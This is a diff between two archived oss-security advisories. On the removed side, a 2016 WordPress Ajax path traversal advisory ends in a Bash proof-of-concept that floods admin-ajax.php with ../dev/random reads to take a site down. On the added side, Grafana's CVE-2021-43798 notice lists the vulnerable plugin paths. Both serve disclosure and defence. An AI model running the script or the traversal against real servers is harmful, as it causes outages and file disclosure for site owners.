@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["5253" "Saturday" "20" "August" "2016" "11:05:47" "+0200" "Summer of Pwnage" "lists@securify.nl" "<b9077094-e1d3-cfd5-5c97-1ddf970d8a9a@securify.nl>" "135" "[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers" "^Date:" nil nil "8" "2016082009:05:47" "[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers" (number mark "U       lists@securi Aug 20  135/5253  " thread-indent "\"[oss-security] Path traversal vulnerability in WordPress Core Ajax handlers\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6923" "Thursday" "9" "December" "2021" "17:07:13" "+0100" "Daniel Lee" "daniel@grafana.com" nil "221" "[oss-security] CVE-2021-43798 Grafana directory traversal" nil nil nil "12" nil nil (number mark "U       daniel@grafa Dec  9  221/6923  " thread-indent "\"[oss-security] CVE-2021-43798 Grafana directory traversal\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] CVE-2021-43798 Grafana directory traversal" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 21699 invoked by uid 550); 20 Aug 2016 09:06:02 -0000
+Received: (qmail 32245 invoked by uid 550); 9 Dec 2021 16:41:47 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,153 +11,259 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 21651 invoked from network); 20 Aug 2016 09:06:01 -0000
-X-Virus-Scanned: amavisd-new at pine.nl
-Organization: Securify B.V.
-Message-ID: <b9077094-e1d3-cfd5-5c97-1ddf970d8a9a@securify.nl>
-User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101
- Thunderbird/45.2.0
-MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8; format=flowed
-Content-Transfer-Encoding: 7bit
-Date: Sat, 20 Aug 2016 11:05:47 +0200
-From: Summer of Pwnage <lists@securify.nl>
 Reply-To: oss-security@lists.openwall.com
-Subject: [oss-security] Path traversal vulnerability in WordPress Core Ajax handlers
+Received: (qmail 9910 invoked from network); 9 Dec 2021 16:07:36 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=grafana.com; s=g1;
+        h=mime-version:from:date:message-id:subject:to;
+        bh=ih5vuHckmzzCIKZo2h/oBkympgRHwJNaVM4vrI0qOHE=;
+        b=nzScDKN2P3W4dhuRq5SDGkPw9zs4BB5y/ipQdzpnf8yS5SvqXzDg56+9VRD0ac23Kv
+         K2NWYtlCyMX+JqotOe3OA3jc8C5isF9y3fkNOxX55eSCQTAGEAFfrVCm4vq5KMhSjOps
+         zGkgqXh0jaGDpsKIu0+HwSEBt2f/sGWq5D6qEZD3QzyuGXq7lkXpDYRwI2OIxXkajPyf
+         uqBPX5MjCAWwjywLLzegZ/yHmYsGbD4aMb/vYEHlJVeHIvjxYCau+rZLPk7Yv8lGm1j6
+         sm3pE9ayGXSzlazxKRHQuWw696MYDZPBd2HzLQLixECV9zTvj5uoFZU3HwZKrtRB+N+Z
+         cx0g==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20210112;
+        h=x-gm-message-state:mime-version:from:date:message-id:subject:to;
+        bh=ih5vuHckmzzCIKZo2h/oBkympgRHwJNaVM4vrI0qOHE=;
+        b=QZTTOT6Dcx3wDfZ79qL6g2QaFVBguA/NRgM9UEMyobRDhQJQ8zBqZRyuX+aYkUyPXQ
+         kLPq7vZUYKpKBPw/FMH+x8JUG00+TEpU+iAIkme9HXrqXcXg0YbxEQN5yNmk7wHk2AVQ
+         HjwgbnxVbGgcXYwWsoyP9lhVFnpfCO2zHHxKQ63djmzrGrBIBwQapDACcppJe1jNLhQ6
+         H5mhtJ94lbhns0D4qqgnDYcKdbEd0zo84vqDx6N3UcwL5x1SM+CH0nQQraHooG6F2Wm+
+         9dhtV88m6DhfKKZBRxFtTLArWkQWjk+4K8Cxnn9kzh5M4U670AboyHotd/pzXxy4RfzK
+         BFwQ==
+X-Gm-Message-State: AOAM532QAKGkvZve3QNlYap0N6HQl77x70i5WeQp4Teu+1E6QXjpc8tU
+	QImLhSzJjcCDIRc3bbCy1HIPzFxZ79o0R7E12VBuH9OluqOZrQ==
+X-Google-Smtp-Source: ABdhPJwpOmtso8Z7u+pTm6jXN6R0RYxeOg+ldzBCr7CsP2XS4IJpLEBj287OTpnop/StIXpe7Fj06Xm0nVJ9gxoTNwU=
+X-Received: by 2002:a25:37cb:: with SMTP id e194mr7548644yba.449.1639066044280;
+ Thu, 09 Dec 2021 08:07:24 -0800 (PST)
+MIME-Version: 1.0
+From: Daniel Lee <daniel@grafana.com>
+Date: Thu, 9 Dec 2021 17:07:13 +0100
+Message-ID: <CAD7TOkxcZ9v4jO_g8nUnBbcomxePoGhxLcRyDxP=Quo2hH4gFQ@mail.gmail.com>
 To: oss-security@lists.openwall.com
+Content-Type: multipart/alternative; boundary="000000000000555c7b05d2b8cd1d"
+Subject: [oss-security] CVE-2021-43798 Grafana directory traversal
 
-------------------------------------------------------------------------
-Path traversal vulnerability in WordPress Core Ajax handlers
-------------------------------------------------------------------------
-Yorick Koster, July 2016
+--000000000000555c7b05d2b8cd1d
+Content-Type: text/plain; charset="UTF-8"
 
-------------------------------------------------------------------------
-Abstract
-------------------------------------------------------------------------
-A path traversal vulnerability was found in the Core Ajax handlers of
-the WordPress Admin API. This issue can (potentially) be used by an
-authenticated user (Subscriber) to create a denial of service condition
-of an affected WordPress site.
+We released Grafana 8.3.1, 8.2.7, 8.1.8, 8.0.7 on December 7th. This patch
+release includes a high severity security fix that affects Grafana versions
+from v8.0.0-beta1 through v8.3.0.
 
-------------------------------------------------------------------------
-OVE ID
-------------------------------------------------------------------------
-OVE-20160712-0036
+Release v8.3.1, only containing a security fix:
 
-------------------------------------------------------------------------
-See also
-------------------------------------------------------------------------
-#37490 [2] - Improve capability checks in wp_ajax_update_plugin() and
-wp_ajax_delete_plugin()
+- [Download Grafana 8.3.1](https://grafana.com/grafana/download/8.3.1)
 
-------------------------------------------------------------------------
-Tested versions
-------------------------------------------------------------------------
-This issue was successfully tested on the WordPress version 4.5.3.
+- [Release notes](
+https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-3-1/)
 
-------------------------------------------------------------------------
-Fix
-------------------------------------------------------------------------
-WordPress version 4.6 [3] mitigates this vulnerability by moving the
-CSRF check to the top of the affected method(s).
+Release v8.2.7, only containing a security fix:
 
-------------------------------------------------------------------------
-Introduction
-------------------------------------------------------------------------
-WordPress is web software that can be used to create a website, blog,
-or app. A path traversal vulnerability exists in the Core Ajax handlers
-of the WordPress Admin API. This issue can (potentially) be used by an
-authenticated user (Subscriber) to create a denial of service condition
-of an affected WordPress site.
+- [Download Grafana 8.2.7](https://grafana.com/grafana/download/8.2.7)
 
-------------------------------------------------------------------------
-Details
-------------------------------------------------------------------------
-The path traversal vulnerability exists in the file ajax-actions.php, in
-particular in the function wp_ajax_update_plugin(). The vulnerable code
-is shown below.
+- [Release notes](
+https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-2-7/)
 
-function wp_ajax_update_plugin() {
-	global $wp_filesystem;
+Release v8.1.8, only containing a security fix:
 
-	$plugin = urldecode( $_POST['plugin'] );
+- [Download Grafana 8.1.8](https://grafana.com/grafana/download/8.1.8)
 
-	$status = array(
-		'update'     => 'plugin',
-		'plugin'     => $plugin,
-		'slug'       => sanitize_key( $_POST['slug'] ),
-		'oldVersion' => '',
-		'newVersion' => '',
-	);
+- [Release notes](
+https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-1-8/)
 
-	$plugin_data = get_plugin_data( WP_PLUGIN_DIR . '/' . $plugin );
-	if ( $plugin_data['Version'] ) {
-		$status['oldVersion'] = sprintf( __( 'Version %s' ), 
-$plugin_data['Version'] );
-	}
+Release v8.0.7, only containing a security fix:
 
-	if ( ! current_user_can( 'update_plugins' ) ) {
-		$status['error'] = __( 'You do not have sufficient permissions to 
-update plugins for this site.' );
-  		wp_send_json_error( $status );
-	}
+- [Download Grafana 8.0.7](https://grafana.com/grafana/download/8.0.7)
 
-	check_ajax_referer( 'updates' );
+- [Release notes](
+https://grafana.com/docs/grafana/latest/release-notes/release-notes-8-0-7/)
 
-As can be seen in the code above, the function first tries to retrieve
-some version information from the target plugin. After this is done, it
-checks the user's privileges and it will verify the nonce (to prevent
-Cross-Site Request Forgery). The code that retrieves the version
-information from the plugin is vulnerable to path traversal. Since the
-security checks are done at a later stage, the affected code is
-reachable by any logged on user, including Subscribers.
 
-Potentially this issue can be used to disclose information, provided
-that the target file contains a line with Version:. What is more
-important that it also allows for a denial of service condition as the
-logged in attacker can use this flaw to read up to 8 KB of data from
-/dev/random. Doing this repeatedly will deplete the entropy pool, which
-causes /dev/random to block; blocking the PHP scripts. Using a very
-simple script, it is possible for an authenticated user (Subscriber) to
-bring down a WordPress site. It is also possible to trigger this issue
-via Cross-Site Request Forgery as the nonce check is done too late in
-this case.
+## Path Traversal ([CVE-2021-43798](
+https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-43798))
 
-------------------------------------------------------------------------
-Proof of concept
-------------------------------------------------------------------------
-The following Bash script can be used to trigger the denial of service
-condition.
+### Summary
 
-#!/bin/bash
-target="http://<target>"
-username="subscriber"
-password="password"
-cookiejar=$(mktemp)
-	
-# login
-curl --cookie-jar "$cookiejar" \
-	--data
-"log=$username&pwd=$password&wp-submit=Log+In&redirect_to=%2f&testcookie=1" 
-\
-	"$target/wp-login.php" \
-	>/dev/null 2>&1
-	
-# exhaust apache
-for i in `seq 1 1000`
-	do
-		curl --cookie "$cookiejar" \
-		--data 
-"plugin=../../../../../../../../../../dev/random&action=update-plugin" \
-		"$target/wp-admin/admin-ajax.php" \
-		>/dev/null 2>&1 &
-done
-	
-rm "$cookiejar"
-------------------------------------------------------------------------
-References
-------------------------------------------------------------------------
-[1] 
-https://sumofpwn.nl/advisory/2016/path_traversal_vulnerability_in_wordpress_core_ajax_handlers.html
-[2] https://core.trac.wordpress.org/ticket/37490
-[3] https://wordpress.org/wordpress-4.6.zip
+On 2021-12-03, we received a report that Grafana is vulnerable to directory
+traversal, allowing access to local files. We have confirmed this for
+versions 8.0.0-beta1 to 8.3.0. Thanks to our defense-in-depth approach, at
+no time has [Grafana Cloud](https://grafana.com/cloud) been vulnerable.
+
+The vulnerable URL path is: <grafana_host_url>/public/plugins/<plugin-id>/,
+where <plugin-id> is the plugin ID for any installed plugin.
+
+Every Grafana instance comes with pre-installed plugins like the Prometheus
+plugin or MySQL plugin so the following URLs are vulnerable for every
+instance:
+
+* <grafana_host_url>/public/plugins/alertlist/
+
+* <grafana_host_url>/public/plugins/annolist/
+
+* <grafana_host_url>/public/plugins/barchart/
+
+* <grafana_host_url>/public/plugins/bargauge/
+
+* <grafana_host_url>/public/plugins/candlestick/
+
+* <grafana_host_url>/public/plugins/cloudwatch/
+
+* <grafana_host_url>/public/plugins/dashlist/
+
+* <grafana_host_url>/public/plugins/elasticsearch/
+
+* <grafana_host_url>/public/plugins/gauge/
+
+* <grafana_host_url>/public/plugins/geomap/
+
+* <grafana_host_url>/public/plugins/gettingstarted/
+
+* <grafana_host_url>/public/plugins/grafana-azure-monitor-datasource/
+
+* <grafana_host_url>/public/plugins/graph/
+
+* <grafana_host_url>/public/plugins/heatmap/
+
+* <grafana_host_url>/public/plugins/histogram/
+
+* <grafana_host_url>/public/plugins/influxdb/
+
+* <grafana_host_url>/public/plugins/jaeger/
+
+* <grafana_host_url>/public/plugins/logs/
+
+* <grafana_host_url>/public/plugins/loki/
+
+* <grafana_host_url>/public/plugins/mssql/
+
+* <grafana_host_url>/public/plugins/mysql/
+
+* <grafana_host_url>/public/plugins/news/
+
+* <grafana_host_url>/public/plugins/nodeGraph/
+
+* <grafana_host_url>/public/plugins/opentsdb
+
+* <grafana_host_url>/public/plugins/piechart/
+
+* <grafana_host_url>/public/plugins/pluginlist/
+
+* <grafana_host_url>/public/plugins/postgres/
+
+* <grafana_host_url>/public/plugins/prometheus/
+
+* <grafana_host_url>/public/plugins/stackdriver/
+
+* <grafana_host_url>/public/plugins/stat/
+
+* <grafana_host_url>/public/plugins/state-timeline/
+
+* <grafana_host_url>/public/plugins/status-history/
+
+* <grafana_host_url>/public/plugins/table/
+
+* <grafana_host_url>/public/plugins/table-old/
+
+* <grafana_host_url>/public/plugins/tempo/
+
+* <grafana_host_url>/public/plugins/testdata/
+
+* <grafana_host_url>/public/plugins/text/
+
+* <grafana_host_url>/public/plugins/timeseries/
+
+* <grafana_host_url>/public/plugins/welcome/
+
+* <grafana_host_url>/public/plugins/zipkin/
+
+We have received CVE-2021-43798 for this issue. The CVSS score for this
+vulnerability is 7.5 High (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+for Grafana versions 8.0.0-beta1 to 8.3.0
+
+### Affected versions with high severity
+
+Grafana 8.0.0-beta1 to 8.3.0
+
+### Solutions and mitigations
+
+All installations between v8.0.0-beta1 and v8.3.0 should be upgraded as
+soon as possible.
+
+If you can not upgrade, running a reverse proxy in front of Grafana that
+normalizes the PATH of the request will mitigate the vulnerability. For
+example the normalize_path
+<https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto#envoy-v3-api-field-extensions-filters-network-http-connection-manager-v3-httpconnectionmanager-normalize-path>
+setting in envoy.
+
+Thanks to our defense-in-depth approach, [Grafana Cloud](
+https://grafana.com/cloud) instances have not been affected by the
+vulnerability.
+
+As always, we closely coordinated with all cloud providers licensed to
+offer Grafana Pro. They have received early notification under embargo and
+confirmed that their offerings are secure at the time of this announcement.
+In alphabetical order, this is applicable to Amazon Managed Grafana, and
+Azure Managed Grafana.
+
+### Timeline and postmortem
+
+Here is a detailed timeline starting from when we originally learned of the
+issue. All times in UTC.
+
+* 2021-12-03: Security researcher sends the initial report
+
+* 2021-12-03: Confirmed for 8.0.0-beta1 through 8.3.0
+
+* 2021-12-03: Confirmed that Grafana Cloud is not vulnerable
+
+* 2021-12-03: Security fix determined and committed to Git
+
+* 2021-12-03: Release timeline determined: 2021-12-07 for private customer
+release, 2021-12-14 for public release
+
+* 2021-12-06: Second report about the vulnerability received
+
+* 2021-12-07: We received information that the vulnerability has been
+leaked to the public, turning it into a 0day
+
+* 2021-12-07: Decision made to release as quickly as feasible
+
+* 2021-12-07: Private release with two hour grace period
+
+* 2021-12-07: Public release
+
+## Reporting security Issues
+
+If you think you have found a security vulnerability, please send a report
+to [security@grafana.com](mailto:security@grafana.com). This address can be
+used for all of
+
+Grafana Labs' open source and commercial products (including but not
+limited to Grafana, Grafana Cloud, Grafana Enterprise, and grafana.com). We
+can accept only vulnerability reports at this address. We would prefer that
+you encrypt your message to us by using our PGP key. The key fingerprint is
+
+F988 7BEA 027A 049F AE8E  5CAA D125 8932 BE24 C5CA
+
+The key is available from [keyserver.ubuntu.com](
+https://keyserver.ubuntu.com/pks/lookup?search=0xF9887BEA027A049FAE8E5CAAD1258932BE24C5CA&fingerprint=on&op=index
+).
+
+## Security announcements
+
+We maintain a [security category on our blog}(
+https://grafana.com/tags/security/),
+
+where we will always post a summary, remediation, and mitigation details
+for any patch containing security fixes.
+
+You can also subscribe to our [RSS feed](
+https://grafana.com/tags/security/index.xml).
+
+Regards,
+Daniel Lee, Grafana Labs
+
+--000000000000555c7b05d2b8cd1d--
